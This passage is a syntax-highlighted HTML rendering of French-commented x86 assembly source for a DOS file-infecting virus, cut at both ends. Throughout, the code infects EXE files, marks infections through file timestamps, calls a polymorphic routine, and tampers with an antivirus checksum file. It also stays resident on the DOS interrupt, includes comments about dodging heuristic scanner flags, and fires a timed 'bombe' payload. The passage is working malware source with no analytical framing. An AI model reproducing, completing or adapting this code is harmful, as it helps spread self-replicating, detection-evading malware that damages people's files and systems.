</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"i"</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">                                           </span><span class="sc1">;puis la signature</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">enuns7</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"SN"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_enuns</span><span class="sc0">
</span><span class="sc1">;   pop cx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">size_for_stealth</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc1">;   push cx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">enuns7</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enuns7</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">pas_enuns</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_debut</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                      </span><span class="sc1">;des 4 premiers octets</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">             </span><span class="sc1">;stockes dans cette zone</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main</span><span class="sc0">

</span><span class="sc1">; 5) INFECTION DES EXE</span><span class="sc0">

</span><span class="sc5">infecte_exe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">;fichier windows?? </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_pas_bon</span><span class="sc0">                                  </span><span class="sc1">;oui =&gt; pas touche</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;overlay?? </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exe_pas_bon</span><span class="sc0">                                  </span><span class="sc1">;oui =&gt; pas touche</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"i"</span><span class="sc0">  </span><span class="sc1">;c'est un .exe deja infecte? </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_pas_bon</span><span class="sc0">                                  </span><span class="sc1">;oui =&gt; pas touche</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;c'est un vrai .EXE? </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                      </span><span class="sc1">;somme de M+Z</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0A7h</span><span class="sc0">                                     </span><span class="sc1">;  !!!evite flag Z!!!</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_bon</span><span class="sc0">

</span><span class="sc5">exe_pas_bon</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc0">
</span><span class="sc5">exe_bon</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_exe1_from_resident</span><span class="sc0">
</span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">POLY_FROM_RESIDENT</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_exe2_from_resident</span><span class="sc0">

</span><span class="sc1">; 6) fermeture et retour au programme</span><span class="sc0">

</span><span class="sc5">ferme_et_redonne_la_main</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">size_for_stealth</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">                       </span><span class="sc1">;change seconds to 30</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_time</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1111100000000000b</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_time</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                </span><span class="sc1">;as an infection marker</span><span class="sc0">

</span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_timedate</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3e00h</span><span class="sc0">                                   </span><span class="sc1">;fermeture du fichier</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">redonne_la_main_attributs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;nom du fichier</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;ds ds:dx pour attributs</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_attribs</span><span class="sc0">

</span><span class="sc5">redonne_la_main</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">marqueur_inf</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">modif_crc</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pas_modif_crc</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------modification des anti-vir.dat------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">modif_crc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crc_file</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recup_attribs</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">pas_modif_crc</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">annule_attribs</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_file</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recup_timedate</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_fin</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000d</span><span class="sc0">                           </span><span class="sc1">;verif taille pas &gt; 8000</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ferme_crc</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_debut</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">compare</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ferme_crc</span><span class="sc0">                            </span><span class="sc1">;modifier le nom du fichier infecte</span><span class="sc0">
</span><span class="sc6">cmpsw</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">compare_ok</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compare</span><span class="sc0">
</span><span class="sc5">compare_ok</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">rien_trouve</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_debut</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">         </span><span class="sc1">;ecriture</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">ferme_crc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_timedate</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crc_file</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_attribs</span><span class="sc0">

</span><span class="sc5">pas_modif_crc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">marqueur_inf</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">vieille_int_21</span><span class="sc0">        </span><span class="sc1">;apres l'infection on continue avec l'int normale</span><span class="sc0">

</span><span class="sc1">;****** si le programme est deja resident, ou apres mise en TSR *********</span><span class="sc0">

</span><span class="sc5">deja_installe</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;******************* bombe ou pas? **********************************</span><span class="sc0">

</span><span class="sc5">bombe_ou_pas</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">             </span><span class="sc1">;horloge interne: renvoie ch=heure et cl=minute</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;go!</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30d</span><span class="sc0">             </span><span class="sc1">;on est a 30'?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">com_ou_exe</span><span class="sc0">          </span><span class="sc1">;non: on redonne la main</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15d</span><span class="sc0">             </span><span class="sc1">;oui: on teste les secondes</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">com_ou_exe</span><span class="sc0">           </span><span class="sc1">;si secondes &gt; 15 on redonne la main</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">bombe</span><span class="sc0">               </span><span class="sc1">;sinon, on declenche la bombe (1/120) </span><span class="sc0">

</span><span class="sc1">;************* redonner la main a un com ou a un exe? ****************</span><span class="sc0">

</span><span class="sc5">com_ou_exe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">;recup des segments originaux</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">         </span><span class="sc1">;COM: a offset 0 on a INT 20h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">redonne_main_com</span><span class="sc0">             

</span><span class="sc1">;------------- redonner la main a un exe ---------------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">vCS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">vSS</span><span class="sc4">]</span><span class="sc0">    
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">vSP</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">annuler_registres</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                 </span><span class="sc1">;faux jump far pour les exe</span><span class="sc0">
</span><span class="sc5">contenu</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">vIP</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">            </span><span class="sc1">;zone de stockage disque</span><span class="sc0">
</span><span class="sc5">vCS</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">            </span><span class="sc1">;EXE: stocke ip, cs, ss, sp </span><span class="sc0">
</span><span class="sc5">vSS</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">            </span><span class="sc1">;COM: stocke les 5 premiers octets   </span><span class="sc0">
</span><span class="sc5">vSP</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">

</span><span class="sc1">;------------- redonner la main a un com ---------------------------</span><span class="sc0">

</span><span class="sc5">redonne_main_com</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;transfert des 4 premiers</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                           </span><span class="sc1">;octets de leur zone mem</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;vers le debut du fichier   </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">102h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                           </span><span class="sc1">;!!!evite flag O!!!</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">101h</span><span class="sc0">                    </span><span class="sc1">;     !!!evite flag B!!! </span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">;on met 100h dans le stack pour le RET</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">annuler_registres</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;retour au programme</span><span class="sc0">

</span><span class="sc1">;**********************************************************************</span><span class="sc0">
</span><span class="sc1">;*************** procédures diverses *********************</span><span class="sc0">
</span><span class="sc1">;**********************************************************************</span><span class="sc0">

</span><span class="sc5">recup_attribs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">                              </span><span class="sc1">;recup attrib dans al</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_attrib</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">;attrib en memoire</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">annule_attribs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                                      </span><span class="sc1">;annule attrib</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_attribs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_attrib</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;remettre les attributs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">recup_timedate</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">                      </span><span class="sc1">;recup time/date</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_time</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">;en memoire</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_date</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_timedate</span><span class="sc4">:</span><span class="sc0">
